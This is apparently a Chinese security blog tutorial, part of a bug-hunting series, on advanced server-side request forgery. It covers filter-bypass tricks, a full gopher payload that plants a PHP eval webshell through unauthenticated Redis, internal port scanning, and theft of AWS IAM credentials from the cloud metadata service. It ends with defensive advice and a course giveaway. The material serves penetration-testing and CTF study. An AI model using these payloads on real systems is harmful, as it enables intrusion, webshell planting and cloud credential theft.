#  漏洞挖掘实战系列（第16期）：SSRF高级利用 攻击内网+云服务+Redis全解析  
原创 点击关注👉
                    点击关注👉  网络安全学习室   2026-01-20 02:37  
  
在前15期内容中，我们覆盖了Web基础漏洞、业务逻辑、高级SQL注入、文件上传等核心方向，而SSRF（服务器端请求伪造）作为一种“穿透力极强”的漏洞，是挖掘SRC高危漏洞、渗透测试突破边界的关键——它能让服务器替我们发起请求，穿透外网防火墙，直达内网资产。  
  
很多人对SSRF的认知停留在“读取本地文件”，但它的真正价值在于**内网探测、攻击内网服务、拿下云服务、利用中间件getshell**  
。这一期，我拆解SSRF的高级利用场景，从原理到实战，从基础到进阶，每个场景都配“漏洞分析+利用步骤+Payload+避坑指南”，帮你把SSRF用成“内网漫游神器”。  
  
无论你是CTF选手应对内网题型，还是渗透工程师挖掘真实环境漏洞，这篇内容都能直接落地，帮你突破外网限制，触达更深层的资产。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralY4iaxysN4x81wyYx99JcKeocZ6svyL7d7nRAYnOYKvQ7qu30AichSibLuaf7YcA1o7Po4icxSnCjVe9w/640?wx_fmt=png&from=appmsg "")  
## 一、先搞懂：SSRF的核心原理与危害  
### 1. 核心原理  
  
SSRF漏洞产生的根本原因：**服务器信任了客户端传入的URL/主机地址参数，未做严格校验，直接代发起请求**  
。简单说，就是我们让服务器“帮我们访问指定地址”，而服务器能访问到的范围（内网、本地），远比我们的外网IP更广。  
  
常见触发场景：  
- 图片转存（如输入URL转存为图片）；  
  
- 链接预览（如社交平台解析URL标题、封面）；  
  
- 接口调用（如调用第三方API时，URL参数可控）；  
  
- 文件下载（如服务器根据传入URL下载文件到本地）。  
  
### 2. 核心危害  
  
SSRF的危害远不止“读本地文件”，核心价值在于：  
1. **内网探测**  
：扫描内网存活主机、开放端口、运行服务，绘制内网拓扑；  
  
1. **攻击内网服务**  
：利用内网未授权服务（如Redis、MySQL、MongoDB）getshell、写入文件；  
  
1. **攻击云服务**  
：访问云厂商元数据服务（如AWS、阿里云），获取密钥、令牌等敏感信息；  
  
1. **本地权限突破**  
：访问本地敏感服务（如127.0.0.1:22、127.0.0.1:3306），尝试弱口令登录。  
  
## 二、SSRF基础：常见绕过与本地利用  
  
在进阶利用前，先掌握基础的SSRF绕过技巧——很多场景下，服务器会限制请求地址（如禁止127.0.0.1、内网IP），需先绕过限制才能发起攻击。  
### 1. SSRF地址限制绕过技巧  
- **IP变形绕过**  
：将内网IP转换为十进制、八进制、十六进制，绕过字符串匹配。 示例：127.0.0.1 → 2130706433（十进制）、0177.0000.0000.0001（八进制）、0x7F.0x0.0x0.0x1（十六进制）；  
  
- **域名指向绕过**  
：注册自定义域名，将A记录指向内网IP（如将test.com解析到192.168.1.100），传入test.com替代内网IP；  
  
- **特殊域名绕过**  
：利用一些特殊域名默认指向本地，如localhost、0.0.0.0、localhost.localdomain；  
  
- **URL伪协议绕过**  
：利用file、gopher、dict等协议发起请求，部分服务器仅限制http/https协议，对其他协议放行。  
  
### 2. 本地文件读取（基础利用）  
  
通过file协议读取服务器本地敏感文件，适用于SSRF未限制协议的场景。  
#### 实战Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralY4iaxysN4x81wyYx99JcKeorFyhC7oZQ8cRSkQCiavkwJpOMzth36v4qavgmy51mW6jdh4vXAWTw6g/640?wx_fmt=png&from=appmsg "")  
#### 注意事项  
  
部分服务器会限制file协议，可尝试用dict协议间接读取（如dict://127.0.0.1:22/info，通过返回信息判断服务是否存在）。  
## 三、SSRF高级利用：攻击内网服务（实战高频）  
  
内网中大量服务存在未授权访问、弱口令等问题，通过SSRF可直接利用这些服务getshell，这是渗透测试中“突破外网、拿下内网”的核心路径。  
### 场景1：攻击Redis未授权服务（最易getshell）  
#### 1. 漏洞前提  
  
内网Redis服务未设置密码，且绑定在0.0.0.0（允许外部访问），或仅限制本地访问但可通过SSRF绕过。  
#### 2. 利用原理  
  
通过Redis的CONFIG SET命令修改配置，将恶意脚本写入Web目录（如/var/www/html），或写入SSH公钥实现免密登录。  
#### 3. 实战步骤（Gopher协议利用）  
  
Redis默认端口6379，需用gopher协议构造Redis命令（gopher协议支持二进制数据传输，可模拟Redis交互）。  
1. **构造Redis命令**  
：目标是将恶意PHP脚本写入/var/www/html/shell.php。 命令序列：  `flushall  # 清空Redis数据（可选）  
  
set x ""  # 写入恶意内容 config set dir /var/www/html  # 设置写入目录（Web根目录） config set dbfilename shell.php  # 设置写入文件名 save  # 保存到磁盘`  
1. **转换为gopher协议Payload**  
：将上述命令转换为URL编码的gopher格式（需注意换行符用%0D%0A替代）。 最终Payload： gopher://192.168.1.100:6379/_flushall%0D%0Aset%20x%20%22%3C%3Fphp%20eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%22%0D%0Aconfig%20set%20dir%20/var/www/html%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave  
  
1. **发起SSRF请求**  
：将上述Payload作为URL参数传入存在SSRF的接口（如http://target.com/preview?url=Payload）；  
  
1. **验证getshell**  
：访问http://192.168.1.100/shell.php，用蚁剑连接（密码pass），成功拿下WebShell。  
  
#### 4. 避坑指南  
- 需确认Redis权限足够写入目标目录（如Web目录权限为www-data，Redis运行用户需有写入权限）；  
  
- 若Web目录不可写，可尝试写入SSH公钥（~/.ssh/authorized_keys），实现SSH免密登录。  
  
### 场景2：攻击MySQL弱口令服务  
#### 1. 漏洞前提  
  
内网MySQL服务存在弱口令（如root/root、root/123456），且允许外部连接。  
#### 2. 利用原理  
  
通过dict协议或gopher协议，模拟MySQL登录请求，验证弱口令；若成功登录，可执行SQL命令读取数据、写入文件（需MySQL开启secure_file_priv）。  
#### 3. 实战Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralY4iaxysN4x81wyYx99JcKeognRhJLiaZHuoQLk4fLoWQQfSd8b42kibES5oUhCAcJG0EdG3ELMJW9cg/640?wx_fmt=png&from=appmsg "")  
### 场景3：探测内网存活主机与端口  
  
通过SSRF的请求延迟、返回状态，判断内网主机是否存活、端口是否开放，为后续攻击铺路。  
#### 实战方法  
1. **存活主机探测**  
：构造请求访问内网不同IP的80端口，根据返回是否超时判断主机是否存活。 示例：http://target.com/preview?url=http://192.168.1.1-255:80；  
  
1. **端口扫描**  
：针对存活主机，扫描常见端口（22、80、3306、6379、8080）。 示例：http://target.com/preview?url=http://192.168.1.100:6379（若返回Redis相关信息，说明端口开放）。  
  
## 四、SSRF高级利用：攻击云服务（高价值）  
  
云环境中，服务器通常能访问云厂商的元数据服务（如AWS的169.254.169.254、阿里云的100.100.100.200），通过SSRF访问这些服务，可获取密钥、令牌、实例信息等敏感数据，进而控制整个云账号下的资产。  
### 场景1：攻击AWS元数据服务  
#### 1. 元数据服务地址  
  
AWS EC2实例元数据服务地址：http://169.254.169.254/latest/meta-data/  
#### 2. 利用步骤  
1. **获取IAM角色凭证**  
：通过SSRF请求获取临时密钥（可用于访问AWS其他服务）。 Payload： http://target.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  
  若存在IAM角色，会返回角色名称，进一步请求： http://169.254.169.254/latest/meta-data/iam/security-credentials/[角色名称]  
  会返回AccessKeyId、SecretAccessKey、SessionToken；  
  
1. **利用密钥控制AWS服务**  
：用获取的密钥登录AWS CLI，可访问S3存储桶、EC2实例等资产，甚至创建新实例、获取敏感数据。  
  
### 场景2：攻击阿里云元数据服务  
#### 1. 元数据服务地址  
  
阿里云ECS实例元数据服务地址：http://100.100.100.200/latest/meta-data/  
#### 2. 利用Payload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralY4iaxysN4x81wyYx99JcKeoeaysc2MuJIgW9q2NgsHkx4ThetNVvehmteYtnQbvmFiayibqUyExYwtg/640?wx_fmt=png&from=appmsg "")  
  
## 五、SSRF利用避坑与防御建议  
### 1. 实战避坑指南  
- **协议限制**  
：部分服务器仅允许http/https协议，需先测试支持的协议（file、gopher、dict等）；  
  
- **端口限制**  
：服务器可能禁止访问高危端口（如22、3306），可尝试用80、443等常见端口转发；  
  
- **权限问题**  
：利用Redis、MySQL写入文件时，需确认服务运行用户权限足够；  
  
- **返回信息**  
：部分SSRF无返回结果，需通过请求延迟、日志等间接判断是否攻击成功。  
  
### 2. 防御建议（开发者视角）  
1. **严格校验URL参数**  
：禁止传入内网IP、localhost、特殊域名，仅允许访问可信域名；  
  
1. **限制协议**  
：仅允许http/https协议，禁止file、gopher、dict等危险协议；  
  
1. **限制端口**  
：仅允许访问80、443等常见端口，禁止访问22、3306、6379等高危端口；  
  
1. **过滤返回信息**  
：避免将SSRF请求的返回内容泄露给客户端，防止敏感信息泄露；  
  
1. **使用代理**  
：通过专用代理发起请求，限制代理的访问范围，禁止访问内网资产。  
  
## 六、福利  
  
SSRF的核心价值在于“穿透边界”，让你从外网触达内网资产，这也是它在SRC中高频出高危漏洞的原因。掌握本期的内网服务攻击、云服务攻击技巧，你能轻松挖掘高价值漏洞。  
  
**200节攻防教程，限时领！**  
  
想要的兄弟，**关注我+在后台发“想学”**  
，直接免费分享！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/iaLzURuoralZuIxcKhej1WiaMquckK1w0nkqODlicQgkLsOaicNhiaaicicNHCE4XRYCWyDT0lJskRDyicXC0Q3525nu6A/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=17 "")  
  
咱学漏洞挖掘和CTF，光看文章不够，这套教程里全是**实战演示**  
——从工具配置到漏洞利用，每一步都手把手教，跟着练就能上手！  
  
（注：资源领取入口在公众号后台，关注后发“学习”自动弹链接）  
  
### 下期预告  
  
第17期将带来《反序列化漏洞全解析：PHP/Java/Python》，拆解三大语言的反序列化漏洞原理、利用链构造、实战案例，这是CTF和真实渗透中难度较高但危害极大的漏洞类型，帮你突破高级漏洞瓶颈！  
  
